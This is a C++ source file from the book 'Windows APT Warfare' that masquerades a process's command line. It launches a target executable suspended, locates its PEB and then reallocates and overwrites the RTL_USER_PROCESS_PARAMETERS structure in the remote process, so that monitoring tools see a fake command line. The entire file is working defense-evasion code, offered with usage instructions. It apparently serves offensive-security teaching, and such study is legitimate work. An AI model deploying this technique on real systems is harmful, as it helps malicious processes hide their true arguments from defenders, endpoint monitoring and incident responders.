/**
 * masqueradeCmdline.cpp
 *
 * basic idea from:
 * www.ired.team/offensive-security/defense-evasion/masquerading-processes-in-userland-through-_peb
 *
 * Windows APT Warfare
 * by aaaddress1@chroot.org
 */

#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#pragma warning(disable : 4996)
typedef struct m_RTL_USER_PROCESS_PARAMETERS
{
	ULONG MaximumLength;
	ULONG Length;
	ULONG Flags;
	ULONG DebugFlags;
	PVOID ConsoleHandle;
	ULONG ConsoleFlags;
	HANDLE StdInputHandle;
	HANDLE StdOutputHandle;
	HANDLE StdErrorHandle;
	UNICODE_STRING CurrentDirectoryPath;
	HANDLE CurrentDirectoryHandle;
	UNICODE_STRING DllPath;
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
};

m_RTL_USER_PROCESS_PARAMETERS *readFullPage_RtlusrProcParam(HANDLE hProcess, LPVOID whereParamAt)
{
	// fetch the max_size of that memory page.
	m_RTL_USER_PROCESS_PARAMETERS tmpUsrProcParam = {};
	ReadProcessMemory(hProcess, whereParamAt, &tmpUsrProcParam, sizeof(tmpUsrProcParam), 0);

	// read the used data of the current struct in that page.
	m_RTL_USER_PROCESS_PARAMETERS *retUsrProcParam = (m_RTL_USER_PROCESS_PARAMETERS *)new byte[tmpUsrProcParam.MaximumLength + 0x1000];
	memset(retUsrProcParam, '\x00', tmpUsrProcParam.MaximumLength + 0x1000);
	ReadProcessMemory(hProcess, whereParamAt, retUsrProcParam, tmpUsrProcParam.MaximumLength, 0);

	retUsrProcParam->MaximumLength += 0x1000;
	return retUsrProcParam;
}

// UAF method found. To fix abug at Win10 M$ application loader
// thanks to inndy.tw@gmail.com
size_t refresh_allocSizeOfUsrProcParam(HANDLE hProcess, LPVOID whereStructAt, size_t newSize)
{
	if (!VirtualFreeEx(hProcess, whereStructAt, 0, MEM_RELEASE))
		return 0;
	return (size_t)VirtualAllocEx(hProcess, whereStructAt, newSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
}

int wmain(int argc, wchar_t **argv)
{
	if (argc < 3)
	{
		puts("usage: mqCmdline [path/to/exe] [arg/to/pass]");
		puts("  e.g. mqCmdline cmd.exe /c echo 30cm.tw & pause");
		return 0;
	}

	PROCESS_INFORMATION PI = {};
	STARTUPINFO SI = {};
	CONTEXT CTX = {CONTEXT_FULL};
	wchar_t new_szCmdlineUnicode[0x2000] = {0};
	PEB remotePeb;

	// prepare fake cmdline.
	for (size_t i = 2; i < argc; i++)
	{
		wcscat(new_szCmdlineUnicode, argv[i]);
		wcscat(new_szCmdlineUnicode, L"\x20");
	}

	if (CreateProcessW(0, argv[1], 0, 0, false, CREATE_SUSPENDED, 0, 0, &SI, &PI))
		if (GetThreadContext(PI.hThread, &CTX))
		{
			printf("[+] lookup where RTL_USER_PROCESS_PARAMETERS at (from PEB)\n");
			ReadProcessMemory(PI.hProcess, LPVOID(CTX.Rbx), &remotePeb, sizeof(remotePeb), 0);

			printf("[+] fetch current page memory of the param struct\n");
			auto rtlParamShouldAt = LPVOID(remotePeb.ProcessParameters);
			m_RTL_USER_PROCESS_PARAMETERS *disguiseRtlParam = readFullPage_RtlusrProcParam(PI.hProcess, rtlParamShouldAt);
			refresh_allocSizeOfUsrProcParam(PI.hProcess, rtlParamShouldAt, disguiseRtlParam->MaximumLength);

			printf("[+] preparing new unicode struct for the cmdline\n");
			memcpy((void *)((size_t)disguiseRtlParam + disguiseRtlParam->Length), new_szCmdlineUnicode, wcslen(new_szCmdlineUnicode) * 2 + 2);
			disguiseRtlParam->CommandLine.Buffer = (LPWSTR)((size_t)rtlParamShouldAt + disguiseRtlParam->Length);
			disguiseRtlParam->CommandLine.Length = wcslen(new_szCmdlineUnicode) * 2;
			disguiseRtlParam->CommandLine.MaximumLength = disguiseRtlParam->CommandLine.Length + 2;

			printf("[+] update RTL_USER_PROCESS_PARAMETERS in remote\n");
			disguiseRtlParam->Length = disguiseRtlParam->MaximumLength;
			WriteProcessMemory(PI.hProcess, rtlParamShouldAt, disguiseRtlParam, disguiseRtlParam->MaximumLength, 0);

			printf("[+] run...\n--\n");
			ResumeThread(PI.hThread);
		}
	return 0;
}
